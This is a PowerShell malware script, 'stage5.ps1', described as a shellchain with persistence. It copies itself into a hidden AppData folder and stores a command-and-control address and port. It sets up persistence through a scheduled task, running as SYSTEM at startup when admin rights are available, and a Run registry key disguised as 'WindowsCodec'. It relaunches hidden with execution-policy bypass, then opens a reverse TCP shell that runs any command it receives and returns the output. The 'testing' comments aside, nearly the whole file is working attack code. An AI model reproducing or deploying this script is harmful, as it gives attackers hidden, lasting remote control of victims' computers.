# stage5.ps1 — Full shellchain with persistence
# Modified for testing with correct IP

$__sp = if ($PSCommandPath) { $PSCommandPath } else { $MyInvocation.MyCommand.Path }
Remove-Module PSReadLine -ErrorAction SilentlyContinue
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'

$pf        = "$env:appdata\unicode"
$targetPs1 = Join-Path $pf "unicodeEBwdz.ps1"
$iptxt     = Join-Path $pf "ip.txt"
$porttxt   = Join-Path $pf "port.txt"
$cmdPs1    = Join-Path $pf "unicodecmd.ps1"

# ── INSTALL BRANCH — runs once on first execution ────────────────────────────
if (-not (Test-Path $targetPs1)) {
    Write-Host "[INSTALL] Creating persistence folder: $pf"
    New-Item -ItemType Directory -Force -Path $pf | Out-Null

    Write-Host "[INSTALL] Copying payload to: $targetPs1"
    Copy-Item $__sp $targetPs1 -Force

    # Write C2 config
    $defaultIP   = '192.168.0.100'
    $defaultPort = '4444'
    Write-Host "[INSTALL] Writing C2 config: $defaultIP`:$defaultPort"
    Set-Content -Path $iptxt   -Value $defaultIP
    Set-Content -Path $porttxt -Value $defaultPort

    # Persist via scheduled task
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    Write-Host "[INSTALL] Running as admin: $isAdmin"
    
    $conhostArg = "--headless powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -File `"$targetPs1`""
    $action   = New-ScheduledTaskAction -Execute "C:\Windows\System32\conhost.exe" -Argument $conhostArg
    $settings = New-ScheduledTaskSettingsSet -MultipleInstances IgnoreNew -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

    if ($isAdmin) {
        $trigger = New-ScheduledTaskTrigger -AtStartup
        Write-Host "[INSTALL] Creating SYSTEM scheduled task (AtStartup trigger)"
        Register-ScheduledTask -TaskName "Unicode" -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest -Force | Out-Null
        
        Write-Host "[INSTALL] Adding HKLM Run key"
        Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsCodec" -Value "C:\Windows\System32\conhost.exe $conhostArg"
    } else {
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Seconds 60) -RepetitionDuration (New-TimeSpan -Days 9999)
        Write-Host "[INSTALL] Creating user scheduled task (repeats every 60s for testing)"
        Register-ScheduledTask -TaskName "Unicode" -Action $action -Trigger $trigger -Settings $settings -User $env:USERNAME -Force | Out-Null
        
        Write-Host "[INSTALL] Adding HKCU Run key"
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsCodec" -Value "C:\Windows\System32\conhost.exe $conhostArg"
    }

    Write-Host "[INSTALL] Launching hidden copy and exiting dropper..."
    Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -ExecutionPolicy Bypass -File `"$targetPs1`"" -WindowStyle Hidden
    Start-Sleep -Milliseconds 500
    
    Write-Host "[INSTALL] Install complete. Persistence established."
    # Don't delete original in test mode
    exit
}

# ── RUN BRANCH — all subsequent executions ────────────────────────────────────
Write-Host "[RUN] Shellchain active from: $targetPs1"

$targetIP    = (Get-Content $iptxt -Raw).Trim()
$targetPort  = [int](Get-Content $porttxt -Raw).Trim()
Write-Host "[RUN] Connecting to C2: $targetIP`:$targetPort"

$retrySeconds = 5

while ($true) {
    $client = $null
    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($targetIP, $targetPort)
    } catch {
        Write-Host "[RUN] Connection failed, retrying in $retrySeconds`s..."
        Start-Sleep -Seconds $retrySeconds
        continue
    }

    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true
    $reader = New-Object System.IO.StreamReader($stream)

    $writer.WriteLine("[+] SHELLCHAIN | $env:COMPUTERNAME\$env:USERNAME | PID: $PID")
    Write-Host "[RUN] Connected! Waiting for commands..."

    try {
        while ($client.Connected) {
            if ($stream.DataAvailable) {
                $cmd = $reader.ReadLine()
                if ($cmd -and $cmd.Trim()) {
                    if ($cmd.Trim().ToLower() -eq 'exit') {
                        $writer.WriteLine("[*] Session closed.")
                        break
                    }
                    try {
                        $out = (Invoke-Expression $cmd 2>&1 | Out-String).TrimEnd()
                        $writer.WriteLine($out)
                    } catch {
                        $writer.WriteLine("Error: $($_.Exception.Message)")
                    }
                }
            }
            Start-Sleep -Milliseconds 50
        }
    } catch {}
    
    $client.Close()
    Write-Host "[RUN] Disconnected, reconnecting..."
    Start-Sleep -Seconds $retrySeconds
}
